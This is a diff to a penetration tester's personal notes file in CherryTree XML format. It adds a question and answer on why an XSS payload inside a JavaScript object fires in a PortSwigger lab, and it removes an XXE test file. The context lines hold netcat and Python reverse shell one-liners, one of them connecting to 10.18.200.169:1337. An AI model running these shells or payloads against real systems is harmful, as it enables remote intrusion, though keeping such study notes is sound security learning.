@@ -934,7 +934,7 @@ After you’ve found leaked credentials, you can use KeyHacks (</rich_text>
 			<rich_text> to check if the credentials are valid and learn how to use them to access the target’s services</rich_text>
 		</node>
 	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="exploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471333.24" ts_lastsave="1655817747.98" unique_id="36">
+	<node custom_icon_id="0" foreground="" is_bold="False" name="exploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471333.24" ts_lastsave="1657475731.84" unique_id="36">
 		<rich_text></rich_text>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="command_injection_or_shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471362.28" ts_lastsave="1655965678.03" unique_id="37">
 			<rich_text>Reverse
@@ -953,6 +953,18 @@ mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.18.200.169&quot;,1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)'
 
 </rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="unique_javascript_behaviour" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1657475731.84" ts_lastsave="1657483366.37" unique_id="76">
+			<rich_text>I just started working on portswigger's web cache poisoning, there is an XSS in which we inject a javascript object where the result of the injection looks like this:
+
+```data = { &quot;a&quot; : &quot;b&quot;, &quot;c&quot; : &quot;c&quot;-alert(0)-&quot;c&quot;}```
+
+my question is, why is this alert got triggered? also this triggers on the following arithmetic operator +*%/ (addition, multiplication, modulo, and division) which led me to believe that it have to do with valid javascript strings operation, that somehow the alert js got evaluated by the browser?
+
+anybody can help?
+
+</rich_text>
+			<rich_text foreground="#e7e9ea">JavaScript will allow you to use any object with a mathematical operator. In this case both strings will be used with the - operator and alert will be called and the result of calling alert will be undefined and that will also be used as part of the expression.</rich_text>
 		</node>
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="post_exploit_shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655814635.88" ts_lastsave="1656818398.09" unique_id="51">
@@ -1730,73 +1742,6 @@ exit</rich_text>
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="obfuscate_deobfuscate" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1656818398.09" ts_lastsave="1656836768.77" unique_id="74">
 		<rich_text>de4jse</rich_text>
-	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="tests" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394210.03" ts_lastsave="1655727693.85" unique_id="19">
-		<rich_text></rich_text>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="note.dtd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655395012.38" ts_lastsave="1655395016.26" unique_id="33">
-			<rich_text></rich_text>
-		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="test.xml" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655395016.26" ts_lastsave="1655395043.05" unique_id="34">
-			<rich_text foreground="#808080">&lt;?</rich_text>
-			<rich_text foreground="#569cd6">xml</rich_text>
-			<rich_text foreground="#9cdcfe"> version</rich_text>
-			<rich_text foreground="#d4d4d4">=</rich_text>
-			<rich_text foreground="#ce9178">&quot;1.0&quot;</rich_text>
-			<rich_text foreground="#9cdcfe"> encoding</rich_text>
-			<rich_text foreground="#d4d4d4">=</rich_text>
-			<rich_text foreground="#ce9178">&quot;UTF-8&quot;</rich_text>
-			<rich_text foreground="#808080">?&gt;
-&lt;!</rich_text>
-			<rich_text foreground="#569cd6">DOCTYPE</rich_text>
-			<rich_text foreground="#d4d4d4"> </rich_text>
-			<rich_text foreground="#569cd6">note</rich_text>
-			<rich_text foreground="#d4d4d4"> SYSTEM &quot;note.dtd&quot;</rich_text>
-			<rich_text foreground="#808080">&gt;
-&lt;</rich_text>
-			<rich_text foreground="#569cd6">note</rich_text>
-			<rich_text foreground="#808080">&gt;</rich_text>
-			<rich_text foreground="#d4d4d4"> 
-   </rich_text>
-			<rich_text foreground="#808080">&lt;</rich_text>
-			<rich_text foreground="#569cd6">to</rich_text>
-			<rich_text foreground="#808080">&gt;</rich_text>
-			<rich_text foreground="#d4d4d4">falcon</rich_text>
-			<rich_text foreground="#808080">&lt;/</rich_text>
-			<rich_text foreground="#569cd6">to</rich_text>
-			<rich_text foreground="#808080">&gt;</rich_text>
-			<rich_text>
-   </rich_text>
-			<rich_text foreground="#808080">&lt;</rich_text>
-			<rich_text foreground="#569cd6">from</rich_text>
-			<rich_text foreground="#808080">&gt;</rich_text>
-			<rich_text foreground="#d4d4d4">feast</rich_text>
-			<rich_text foreground="#808080">&lt;/</rich_text>
-			<rich_text foreground="#569cd6">from</rich_text>
-			<rich_text foreground="#808080">&gt;</rich_text>
-			<rich_text foreground="#d4d4d4">    </rich_text>
-			<rich_text>
-   </rich_text>
-			<rich_text foreground="#808080">&lt;</rich_text>
-			<rich_text foreground="#569cd6">heading</rich_text>
-			<rich_text foreground="#808080">&gt;</rich_text>
-			<rich_text foreground="#d4d4d4">hacking</rich_text>
-			<rich_text foreground="#808080">&lt;/</rich_text>
-			<rich_text foreground="#569cd6">heading</rich_text>
-			<rich_text foreground="#808080">&gt;</rich_text>
-			<rich_text foreground="#d4d4d4">    </rich_text>
-			<rich_text>
-   </rich_text>
-			<rich_text foreground="#808080">&lt;</rich_text>
-			<rich_text foreground="#569cd6">body</rich_text>
-			<rich_text foreground="#808080">&gt;</rich_text>
-			<rich_text foreground="#d4d4d4">XXE attack</rich_text>
-			<rich_text foreground="#808080">&lt;/</rich_text>
-			<rich_text foreground="#569cd6">body</rich_text>
-			<rich_text foreground="#808080">&gt;
- &lt;/</rich_text>
-			<rich_text foreground="#569cd6">note</rich_text>
-			<rich_text foreground="#808080">&gt;</rich_text>
-		</node>
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="metasploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655727693.85" ts_lastsave="1655729074.42" unique_id="42">
 		<rich_text>start postgresql for msfdb
